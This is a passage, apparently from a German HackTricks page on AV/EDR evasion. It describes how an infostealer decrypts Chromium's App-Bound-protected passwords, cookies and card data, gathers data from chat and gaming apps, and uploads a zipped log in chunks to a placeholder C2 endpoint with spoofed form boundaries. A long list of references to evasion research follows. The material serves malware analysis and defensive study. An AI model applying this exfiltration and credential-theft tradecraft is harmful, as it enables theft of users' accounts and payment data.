- Die ChromElevator-Routinen verwenden direct-syscall reflective process hollowing, um Code in einen laufenden Chromium-Browser einzuschleusen, AppBound Encryption-Schlüssel zu übernehmen und Passwörter/Cookies/Kreditkartendaten trotz ABE-Härtung direkt aus SQLite-Datenbanken zu entschlüsseln.

### Modulare In-Memory-Erfassung & HTTP-Exfiltration in Blöcken

- `create_memory_based_log` durchläuft eine globale Funktionzeigertabelle `memory_generators` und startet für jedes aktivierte Modul (Telegram, Discord, Steam, Screenshots, Dokumente, Browser-Erweiterungen usw.) einen Thread. Jeder Thread schreibt Ergebnisse in gemeinsam genutzte Puffer und meldet nach einem Join-Zeitraum von etwa 45 Sekunden seine Dateianzahl.
- Sobald alles abgeschlossen ist, wird es mit der statisch gelinkten Bibliothek `miniz` als `%TEMP%\\Log.zip` gezippt. `ThreadPayload1` wartet dann 15 Sekunden und überträgt das Archiv per HTTP POST in 10-MB-Blöcken an `http://<C2>:6767/upload`. Dabei wird eine Browser-`multipart/form-data`-Boundary vorgetäuscht (`----WebKitFormBoundary***`). Jeder Block enthält `User-Agent: upload`, `auth: <build_id>` und optional `w: <campaign_tag>`. An den letzten Block wird `complete: true` angehängt, damit der C2 weiß, dass der erneute Zusammenbau abgeschlossen ist.

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Hiding Your Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusing Chrome Remote Desktop On Red Team Operations A Practical Guide](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Weaponizing Defender's Remediation Driver as a Kernel Operation Primitive](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Crafting Self-Masking Functions Using LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole source](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe function](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Creating a Child Process with Redirected Input and Output](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: Reforging C# Tools with WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Compiling C# / .NET Projects](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty proof-of-concept and source](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Abusing thread pool internals for shellcodeless DLL injection](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [EMBER2024 benchmark dataset and thrember tooling](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Using EMBER2024 to evaluate red team implants](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Evading Machine Learning Based Detections](https://msecops.de/blog/posts/ml-evasion/)

{{#include ../banners/hacktricks-training.md}}
